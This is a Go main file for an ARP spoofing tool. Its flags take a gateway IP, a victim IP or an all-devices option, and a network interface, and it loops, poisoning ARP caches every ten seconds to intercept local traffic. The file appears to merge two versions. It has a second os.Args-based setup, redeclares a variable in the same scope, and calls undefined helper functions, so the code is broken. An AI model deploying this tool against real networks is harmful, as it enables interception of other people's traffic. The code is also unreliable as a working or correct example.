package main

import (
	"arp_spoof/app"
	"arp_spoof/network"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/google/gopacket/pcap"
)

// flags
var (
	all          = flag.Bool("all", false, "target all devices on a network")
	gateway      = flag.String("gate", "", "IP address of the network's gateway")
	victim       = flag.String("vic", "", "IP address of the victim's device")
	netInterface = flag.String("int", "Wi-Fi", "network interface to employ attack")
)

func main() {
	flag.Parse()

	end := make(chan os.Signal, 1)
	defer close(end)
	signal.Notify(end, syscall.SIGTERM, syscall.SIGINT)

	go func() {
		for s := range end {
			fmt.Println(s.String(), "detected. ending program")
			os.Exit(0)
		}
	}()

	winDev, err := network.GetWindowsInterface(*netInterface)
	if err != nil {
		log.Fatal(err)
	}

	deviceHandle, err := pcap.OpenLive(winDev, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer deviceHandle.Close()

	if *gateway == "" {
		log.Fatal("err: gateway IP required\n", flag.Usage)
	}

	if *all {
		if err := app.MultipleArpSpoof(*gateway, *netInterface, deviceHandle); err != nil {
			log.Fatal(err)
		}
	} else {
		if *victim == "" {
			log.Fatal("err: victim IP required\n", flag.Usage)
		}

		if err := app.ArpSpoof(*gateway, *victim, *netInterface, deviceHandle); err != nil {
			log.Fatal(err)
		}
	}

	interfaceStr := os.Args[1]
	gatewayIP := net.ParseIP(os.Args[2])
	if gatewayIP == nil {
		log.Fatal(app.ErrIncorrectIPFormat)
	}

	victimIP := net.ParseIP(os.Args[3])
	if victimIP == nil {
		log.Fatal(app.ErrIncorrectIPFormat)
	}

	attackerInfo, err := getAttackerInfo(interfaceStr)
	if err != nil {
		log.Fatal(err)
	}

	device, err := getWindowsInterface(interfaceStr)
	if err != nil {
		log.Fatal(err)
	}

	deviceHandle, err := pcap.OpenLive(device, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer deviceHandle.Close()

	devicesInfo, err := mapIPstoMAC([]net.IP{gatewayIP, victimIP})
	if err != nil {
		log.Fatal(err)
	}

	endSignal := make(chan os.Signal, 1)
	signal.Notify(endSignal, syscall.SIGTERM, syscall.SIGINT)

	go func() {
		for sig := range endSignal {
			fmt.Println(sig.String(), "detected. ending program")
			close(endSignal)
			os.Exit(0)
		}
	}()

	go readPackets(deviceHandle)

	// for attacking multiple devices, obtain device info before entering for loop

	for {
		if err = poisonARPCache(devicesInfo, attackerInfo, deviceHandle); err != nil {
			log.Fatal(err)
		}
		time.Sleep(time.Second * 10)
	}
}
